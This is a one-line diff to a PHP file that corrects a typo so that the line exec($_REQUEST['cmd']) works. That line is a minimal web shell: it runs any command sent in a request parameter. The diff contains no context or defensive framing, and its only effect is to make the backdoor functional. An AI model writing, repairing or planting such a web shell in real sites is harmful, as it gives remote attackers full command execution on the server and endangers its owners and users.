@@ -1,1 +1,1 @@
-<?php exec($_REQQUEST['cmd']);?>
+<?php exec($_REQUEST['cmd']);?>
